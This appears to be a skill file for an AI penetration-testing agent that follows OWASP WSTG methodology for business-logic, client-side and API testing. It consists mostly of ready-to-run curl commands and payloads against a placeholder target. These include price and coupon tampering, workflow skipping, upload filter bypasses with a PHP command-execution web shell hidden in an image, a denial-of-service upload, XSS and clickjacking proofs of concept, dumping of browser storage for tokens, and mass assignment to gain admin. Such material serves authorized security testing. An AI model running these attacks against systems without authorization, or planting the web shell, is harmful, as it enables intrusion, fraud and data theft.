---
name: wstg-logic-client-api
description: Test what a web application permits rather than what it parses — price, currency and workflow manipulation, coupon and file-upload abuse, DOM XSS sources and sinks, postMessage, clickjacking, browser storage, REST enumeration and API mass assignment, covering WSTG-BUSL, CLNT and APIT. CORS, GraphQL, WebSocket and throttling work route to their dedicated attack skills.
metadata:
  acordia:
    family: web-methodology
  cyberstrike:
    source: .cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-logic-client-api/SKILL.md
    commit: 359655518
---

# Business Logic, Client-Side & API Testing (WSTG-BUSL + CLNT + APIT)

## Business Logic Testing

### Price & Payment Manipulation

```bash
# Negative quantity/price
curl -X POST https://TARGET/api/cart -d '{"item_id":1,"quantity":-1,"price":100}'

# Zero/fractional values
curl -X POST https://TARGET/api/cart -d '{"item_id":1,"quantity":0.001}'

# Modify price client-side
curl -X POST https://TARGET/api/checkout -d '{"item_id":1,"price":0.01}'

# Currency confusion
curl -X POST https://TARGET/api/checkout -d '{"amount":100,"currency":"JPY"}'
# (JPY has no decimals; mishandled conversion)

# Discount/coupon abuse
curl -X POST https://TARGET/api/apply-coupon -d '{"code":"SAVE50","code":"SAVE50"}'
# Test: apply multiple times, expired codes, codes from other users
```

### Workflow Bypass

```bash
# Skip steps in multi-step process
# Step 1: /checkout/address → Step 2: /checkout/payment → Step 3: /checkout/confirm
# Try accessing Step 3 directly:
curl -s -H "Cookie: session=TOKEN" https://TARGET/checkout/confirm

# Modify step indicator
curl -X POST https://TARGET/checkout -d '{"step":3,"complete":true}'

# Process flow reversal
# Complete payment → go back → change cart → order ships with old payment
```

### Rate Limiting & Function Abuse

Throttling limits and their bypasses → see `attack-rate-limit-bypass`. Concurrent abuse of a one-shot action — duplicate redemption, double-spend → see `attack-race-condition`.

### File Upload Abuse

```bash
# Extension bypass
# file.php → file.php.jpg, file.pHp, file.php%00.jpg, file.php;.jpg
# Double extension: file.jpg.php, file.php.png

# Content-type bypass
curl -X POST https://TARGET/upload \
  -F "file=@shell.php;type=image/jpeg"

# Polyglot files (valid image + valid PHP)
# Create with: exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
# Rename to image.php.jpg

# Oversized file (DoS)
dd if=/dev/urandom of=bigfile.bin bs=1M count=100
curl -X POST https://TARGET/upload -F "file=@bigfile.bin"

# SVG with XSS
# <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>

# XXE via DOCX (unzip, inject XXE in [Content_Types].xml)
```

## Client-Side Testing

### DOM XSS Sources & Sinks

**Sources (attacker-controlled input):**

```javascript
document.URL
document.location
document.referrer
window.location.hash
window.location.search
window.name
postMessage data
localStorage / sessionStorage
```

**Sinks (dangerous execution points):**

```javascript
// High risk
eval()
document.write()
document.writeln()
innerHTML
outerHTML
insertAdjacentHTML()
element.setAttribute("onclick", ...)
setTimeout(string, ...)
setInterval(string, ...)
new Function(string)
$.html()  // jQuery

// Medium risk
window.location = ...
window.location.href = ...
document.cookie = ...
element.src = ...
```

### DOM XSS Testing

```javascript
// Check for vulnerable patterns in JS
// In browser console:
// Search for sources flowing to sinks

// Test via URL fragment (not sent to server)
https://TARGET/page#<img src=x onerror=alert(1)>
https://TARGET/page#javascript:alert(1)

// Test via query params reflected in DOM
https://TARGET/page?q=<script>alert(1)</script>
https://TARGET/search?term=test" onmouseover="alert(1)
```

### postMessage Vulnerabilities

```javascript
// Check for listeners without origin validation
// In browser console:
// Look for: window.addEventListener("message", ...)
// Vulnerable if no event.origin check

// Test: open target in iframe, send malicious message
// <iframe src="https://TARGET" id="target"></iframe>
// document.getElementById('target').contentWindow.postMessage('payload','*');
```

### Clickjacking Test

```bash
# Check headers
curl -sI https://TARGET | grep -i "x-frame-options\|content-security-policy"

# Missing X-Frame-Options AND no frame-ancestors in CSP = vulnerable
# Create PoC:
# <iframe src="https://TARGET/sensitive-action" style="opacity:0.1" width="500" height="500"></iframe>
# <button style="position:absolute;top:X;left:Y">Click me!</button>
```

### Browser Storage Audit

```javascript
// In browser console, check for sensitive data:
// localStorage
for (let i = 0; i < localStorage.length; i++) {
  let key = localStorage.key(i)
  console.log(key + ": " + localStorage.getItem(key))
}
// sessionStorage
for (let i = 0; i < sessionStorage.length; i++) {
  let key = sessionStorage.key(i)
  console.log(key + ": " + sessionStorage.getItem(key))
}
// Look for: tokens, passwords, PII, API keys
```

## CORS Misconfiguration Testing

Origin reflection, `null` origin, subdomain, prefix and suffix match bypasses, and the wildcard-with-credentials case → see `attack-cors`.

## API Security Testing

### REST API Enumeration

```bash
# Common API documentation paths
curl -s https://TARGET/swagger.json
curl -s https://TARGET/openapi.json
curl -s https://TARGET/api-docs
curl -s https://TARGET/swagger/v1/swagger.json
curl -s https://TARGET/v1/api-docs
curl -s https://TARGET/.well-known/openapi.json

# Method enumeration on endpoints
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method https://TARGET/api/endpoint
  echo
done

# Version testing
curl -s https://TARGET/api/v1/users
curl -s https://TARGET/api/v2/users
curl -s -H "Accept: application/vnd.api.v1+json" https://TARGET/api/users
```

### GraphQL Testing

Introspection, schema extraction, batch and deep-nesting DoS, authorization bypass and endpoint discovery → see `attack-graphql`.

### WebSocket Testing

Origin validation and CSWSH, post-upgrade authentication, message injection and cleartext transport → see `attack-websocket`.

### Mass Assignment in APIs

```bash
# Find writable fields by comparing GET response with PUT/PATCH
GET_RESPONSE=$(curl -s https://TARGET/api/profile -H "Cookie: session=TOKEN")
echo $GET_RESPONSE | jq .
# Take all fields from response, add admin fields, send back:
curl -X PUT https://TARGET/api/profile \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TOKEN" \
  -d '{"name":"test","email":"test@test.com","role":"admin","isVerified":true}'
```

For detailed procedures on any test, read:
`knowledge/web-application/WSTG-BUSL/WSTG-BUSL-{NN}.md`
`knowledge/web-application/WSTG-CLNT/WSTG-CLNT-{NN}.md`
`knowledge/web-application/WSTG-APIT/WSTG-APIT-{NN}.md`
